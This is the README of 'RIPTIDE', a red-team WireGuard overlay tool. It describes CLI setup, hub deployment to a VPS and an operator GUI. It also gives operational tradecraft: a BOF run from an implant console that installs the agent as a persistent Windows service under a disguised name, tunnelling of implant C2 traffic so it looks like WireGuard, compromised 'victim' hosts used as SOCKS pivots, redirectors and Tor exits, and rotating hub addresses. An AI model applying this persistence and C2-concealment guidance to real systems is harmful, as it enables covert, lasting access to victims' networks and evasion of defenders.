# RIPTIDE

Star-topology WireGuard overlay for red-team **ops** (SSH, operator WSS, backup door). Peers talk to the hub. They do not mesh with each other.

Authorized lab / red-team use only. Owned systems or written permission.

```
[windows] [kali] [phone]
     \      |      /
      \     |     /
           HUB
        10.66.0.1
        UDP 51820
        SOCKS :1080 on each peer overlay addr
```

## Crypto

The tunnel **is** WireGuard. Homemade ciphers stay out of this repo.

| layer | algorithm |
|---|---|
| handshake | Noise_IK |
| DH | X25519 (RFC 7748 clamp, same as `wg genkey`) |
| transport | ChaCha20-Poly1305 |
| extra | unique PSK per hub↔peer pair |
| unauthenticated packets | silent (no reply) |
| operator state | `mesh.json` sealed with scrypt + XSalsa20-Poly1305, 32-byte `mesh.key` mode 0600 |

Without `mesh.key` the state file is ciphertext. Lose the key, the roster is gone. Rotate a peer with `mesh.py revoke` then enroll again — its PSK dies with it.

Stock WireGuard on the wire so a phone app and `wg-quick` still load the same conf. No vendor control plane.

## Layout

```
mesh.py                 init / peer / revoke / status / pack / gui / user
lib/keys.py             X25519 + PSK
lib/state.py            sealed mesh.json
lib/crypto.py           at-rest box
lib/render.py           hub/peer confs, units, UFW
agent/                  userspace WG-go + gVisor netstack + SOCKS5 :1080
gui/                    loopback operator UI (127.0.0.1:7667)
bof/                    riptide-install — CopyFile + CreateService (not persist itself)
persist/                systemd unit + optional Windows sc wrapper
templates/              skeletons (no live keys)
```

## CLI

```bash
python3 mesh.py selftest
python3 mesh.py init --name ops --endpoint YOUR.HUB.IP --out ./riptide-out
python3 mesh.py peer --out ./riptide-out --name windows --os windows
python3 mesh.py peer --out ./riptide-out --name kali --os linux
python3 mesh.py peer --out ./riptide-out --name phone --os android
python3 mesh.py status --out ./riptide-out
python3 mesh.py gui --out ./riptide-out          # enroll UI 127.0.0.1:7667
python3 mesh.py user add --out ./riptide-out --name DonMorpheus --role admin
python3 mesh.py user add --out ./riptide-out --name operator --role operator
python3 mesh.py c2 --out ./riptide-out --host YOUR.C2.HOST:443
python3 mesh.py set --out ./riptide-out --name kali --tag ops
```

`riptide-out/mesh.key` and `riptide-out/mesh.json` never go in git. Backup the key separately.

GUI binds loopback only. Cards: overlay IP, persist/session badge, copy `ssh` / `mstsc` / socks. Exit/Tor list is a disabled placeholder.

## Agent

Userspace. No WinTUN, no TAP.

```bash
make agent          # linux
make agent-win      # windows amd64
./agent/riptide-agent --config riptide-out/hub/wg0.conf     # hub
./agent/riptide-agent --config riptide-out/peers/kali.conf  # peer
```

SOCKS5 listens on the overlay address `:1080` (reachable as `10.66.0.X:1080` from other overlay nodes). CONNECT uses the host stack — a door into that machine's network. There is no WAN bind on 4444.

Windows SCM: the same EXE as a service (`--config` next to it). Delayed auto-start, restart on failure, `NT AUTHORITY\NetworkService`.

## BOF installer

`riptide-install` is the installer. After `StartService` it returns. Upload the EXE + conf first (or copy them onto the host); the BOF does not fetch from the network.

```
make bof
# in the implant console
riptide-install C:\Users\Public\riptide-agent.exe C:\Users\Public\peer.conf IntelPma
```

Destination: `%ProgramFiles%\Riptide\`. Pick a boring service name.

Two modes, pick one per host:

- **session** — run the agent from the implant process / a child. Reboot drops the overlay.
- **persist** — BOF + SCM. Overlay comes back after reboot. File on disk is the cost of that.

## Deploy hub to a VPS

Same machine can keep HTTPS C2 on `:443`. Mesh hub is extra UDP `:51820`.

```bash
python3 mesh.py init --name ops --endpoint YOUR.VPS.IP --out ./riptide-out
python3 mesh.py peer --out ./riptide-out --name kali --os linux
./deploy/hub.sh --remote root@YOUR.VPS.IP --out ./riptide-out          # plan
./deploy/hub.sh --remote root@YOUR.VPS.IP --out ./riptide-out --yes    # install
./agent/riptide-agent --config riptide-out/peers/kali.conf
```

`--remote` accepts a `~/.ssh/config` Host (`rt-vps`, …). Script: install `wireguard`, `/etc/wireguard/wg0.conf` mode 600, `ip_forward`, `ufw allow 51820/udp` when ufw is already active, `wg-quick@wg0`. It does not reset UFW, does not lock SSH to `wg0`, does not touch nginx or the C2 listener.

Hub publishes the live host list on **loopback + overlay only** (`127.0.0.1:7668` and `10.66.0.1:7668`), never on WAN. Login is required (`operators.json`, scrypt). **admin** sees WAN IPs and pubkey. **operator** sees overlay + flag + SOCKS, not WAN.

```bash
python3 mesh.py user add --out ./riptide-out --name DonMorpheus --role admin
./deploy/roster.sh --remote root@YOUR.VPS.IP --out ./riptide-out --yes
./deploy/install-gui-linux.sh          # ~/.local/bin/riptide-gui
riptide-gui                            # admin: SSH tunnel, or agent already up
riptide-gui --overlay                  # low-priv Linux: agent splices 127.0.0.1:7668
```

Windows (agent already running): `deploy/windows-connect.ps1` → Edge `http://127.0.0.1:7668/`.

Userspace netstack does not put `10.66` on the host stack. The agent therefore listens `127.0.0.1:7668` and splices TCP onto `10.66.0.1:7668`. That is Connect. Havoc WSS `:443` stays a separate product.

GUI: **entry** (hub you join on UDP 51820) next to **exit** (peer whose SOCKS you send traffic through). Country flags come from the peer WAN IP the hub sees in `wg show`. Click an exit → local SOCKS `127.0.0.1:1080` (agent chains onto that overlay exit). Enroll (`mesh.py peer`) stays on the admin workstation that holds `mesh.key`.

## C2 through the mesh (Demon proxy)

The mesh host is a **C2 proxy**, not a default-route VPN. User Chrome/Explorer on that box stay direct.

Maelstrom payload / listener:

```
Proxy Enabled = true
Proxy Type    = http
Proxy Host    = 127.0.0.1
Proxy Port    = 8080
```

`riptide-agent` (BOF service) already listening:

- `127.0.0.1:8080` HTTP CONNECT — **only the implant** uses this
- matching C2 host is spliced **over overlay UDP 51820** to `10.66.0.1:443` (hub nginx)
- other CONNECT (if any) uses the host stack or the selected exit

Same box: WAN shows WireGuard to the hub, not HTTPS to the C2 name. Other mesh peers can use this host as a redirector at overlay `:8080`. Bind `0.0.0.0:8080` only on an ops box you own (`HTTP=` in `[Riptide]`).

```bash
python3 mesh.py c2 --out ./riptide-out --host YOUR.C2.HOST:443 --via 10.66.0.1:443
python3 mesh.py set --out ./riptide-out --name kali --tag ops --routes 192.168.0.0/24
python3 mesh.py peer --out ./riptide-out --name windows --os windows --tag victim --serve 3389
```

Packed into `peers/*.conf` as `[Riptide]` (userspace agent only; keep it off `wg-quick` hub conf).

## Multiple hubs + rotation

Primary hub keeps one WireGuard identity. Extra **addresses** rotate in the agent (`[Riptide] Hubs=`):

```bash
python3 mesh.py endpoint add --out ./riptide-out --addr 1.2.3.4:51820
python3 mesh.py endpoint list --out ./riptide-out
```

Handshake stale (>90s) → next host:port on the same pubkey. Put DNS and raw IP in the list.

**Hub on a host** (own key, `ListenPort`, BOF):

```bash
python3 mesh.py hub --out ./riptide-out --name harry-hub --os windows \
  --listen 51820 --endpoints 192.168.0.135:51820,203.0.113.10:51820
python3 mesh.py pack --out ./riptide-out --name harry-hub
python3 mesh.py sync --out ./riptide-out --remote rt-vps --yes   # wg syncconf, no bounce
# upload exe + peer.conf, then in implant:
riptide-hub C:\Users\Public\riptide-agent.exe C:\Users\Public\peer.conf IntelPmaHub
```

That host cryptokey-relays overlay peers and is a C2/SOCKS node. BOF opens Windows firewall UDP `ListenPort`. Extra hub addresses rotate the same way (`[Riptide] Hubs.<overlay>=`). If the VPS handshake dies, the agent promotes an extra hub (`Failover=`) to `10.66.0.0/24`. Re-pack other spokes so they get the extra `[Peer]`. Do not copy the VPS hub private key onto a host.

Tor last-hop: Tor daemon on that host (`127.0.0.1:9050`), then:

```bash
python3 mesh.py set --out ./riptide-out --name harry-hub --tor yes
```

Overlay SOCKS on that node dumps traffic into Tor. GUI shows a **tor** badge.

Also on each peer:

- local SOCKS `127.0.0.1:1080` + overlay SOCKS `:1080` (exit)
- Connect GUI splice `:7668`
- control `127.0.0.1:7670` (`POST /exit`) — GUI click sets it
- `Serve` publishes overlay port → `127.0.0.1:port` (RDP etc.)
- `Shields` on victims: overlay SOCKS/HTTP only from `tag=ops`
- Magic names `name.rt` on hub UDP/53 overlay
- session peers drop out of the operator roster when handshake dies

On-box fallback (already root on the hub): `CONFIRM=YES templates/install-hub.sh /etc/wireguard/wg0.conf`.

Hardening later: WAN `80/tcp 443/tcp 51820/udp`; SSH `:22` and operator WSS `:40056` only `in on wg0`. That is `templates/ufw-mesh.sh` (`CONFIRM=YES`) — run it after a peer on the overlay can still SSH.

## License

MIT © 2026 DonMorpheus. `bof/beacon.h` is the public Cobalt Strike BOF API header.
